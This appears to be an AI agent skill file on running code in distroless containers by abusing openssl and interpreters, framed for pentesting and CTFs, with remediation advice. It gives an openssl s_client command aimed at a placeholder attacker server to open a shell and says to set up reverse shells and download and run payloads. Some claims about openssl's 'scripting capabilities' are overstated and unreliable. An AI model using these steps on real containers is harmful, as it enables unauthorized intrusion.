---
name: distroless-exploitation
description: How to execute arbitrary code in distroless containers using available binaries like openssl. Use this skill whenever the user is working on container security, penetration testing, CTF challenges, or needs to understand how to run commands in minimal container environments that lack standard shells and tools. Trigger this for any distroless container exploitation, container escape scenarios, or when analyzing container security posture.
---

# Distroless Container Exploitation

A skill for understanding and exploiting distroless containers in security testing and CTF scenarios.

## What is Distroless

A **distroless container** contains only the necessary dependencies to run a specific application, without additional software or tools. These containers are designed to be:

- **Lightweight** - minimal size
- **Secure** - reduced attack surface
- **Minimal** - no shells, package managers, or common utilities

### Common Distroless Sources

- **Google Distroless**: `gcr.io/distroless/`
- **Chainguard Images**: `cgr.dev/chainguard/`

## Exploitation Goal

The goal is to **execute arbitrary binaries and payloads** despite the limitations:
- No standard shell (`/bin/sh`, `/bin/bash`)
- No common utilities (`curl`, `wget`, `python`, etc.)
- Often read-only filesystems
- `/dev/shm` may be `no-execute`

## Technique: Via Existing Binaries

### OpenSSL Exploitation

The binary **`openssl`** is frequently found in distroless containers because it's needed by applications for TLS/SSL operations.

#### Why OpenSSL Works

OpenSSL is a **Swiss Army knife** binary with many built-in capabilities:
- Can execute arbitrary code via its `s_client` and other commands
- Has built-in scripting capabilities
- Often present even in minimal containers

#### Basic Approach

1. **Check if openssl exists**:
   ```bash
   /usr/bin/openssl version
   ```

2. **Use openssl to spawn a shell** (if available):
   ```bash
   /usr/bin/openssl s_client -connect <attacker-server>:<port>
   ```

3. **Execute commands through openssl**:
   - Use `openssl s_client` to establish reverse shells
- Use `openssl` to download and execute payloads
- Leverage `openssl`'s various subcommands for code execution

#### Reference

See the Form3 Engineering blog post for detailed exploitation techniques:
https://www.form3.tech/engineering/content/exploiting-distroless-images

## Technique: Through Memory (Coming Soon)

Memory-based exploitation techniques are being documented for future versions.

## Practical Workflow

### Step 1: Reconnaissance

When you gain access to a distroless container:

1. **List available binaries**:
   ```bash
   ls -la /usr/bin/
   ls -la /bin/
   ```

2. **Check for openssl**:
   ```bash
   which openssl
   /usr/bin/openssl version
   ```

3. **Check filesystem permissions**:
   ```bash
   mount | grep -E '(/dev/shm|/tmp)'
   ```

### Step 2: Identify Available Tools

Look for these common binaries that might be present:
- `openssl` - most common, highly exploitable
- `python` - if present, can execute arbitrary code
- `perl` - if present, can execute arbitrary code
- `ruby` - if present, can execute arbitrary code
- `node` - if present, can execute arbitrary code
- `java` - if present, can execute arbitrary code

### Step 3: Exploit Available Binary

Based on what you find, use the appropriate technique:

**If openssl is available**:
- Use openssl to establish reverse shells
- Use openssl to download and execute payloads
- Leverage openssl's scripting capabilities

**If other interpreters are available**:
- Use them to execute arbitrary code
- Download and run payloads
- Establish reverse shells

## Security Testing Context

This skill is designed for:
- **Penetration testing** - authorized security assessments
- **CTF challenges** - capture the flag competitions
- **Security research** - understanding container security
- **Red teaming** - authorized adversarial simulation

## Important Notes

- **Authorization**: Only use these techniques on systems you own or have explicit permission to test
- **Documentation**: Document your findings for remediation
- **Remediation**: Work with teams to properly secure containers

## Remediation Guidance

To prevent distroless container exploitation:

1. **Use proper distroless images** from trusted sources
2. **Implement runtime security** (seccomp, AppArmor)
3. **Use read-only filesystems** where possible
4. **Drop unnecessary capabilities**
5. **Implement network policies**
6. **Monitor container behavior**
7. **Use container security tools** (Falco, Sysdig, etc.)

## References

- [Form3 - Exploiting Distroless Images](https://www.form3.tech/engineering/content/exploiting-distroless-images)
- [Google Distroless](https://console.cloud.google.com/gcr/images/distroless/GLOBAL)
- [Chainguard Images](https://github.com/chainguard-images/images/tree/main/images)
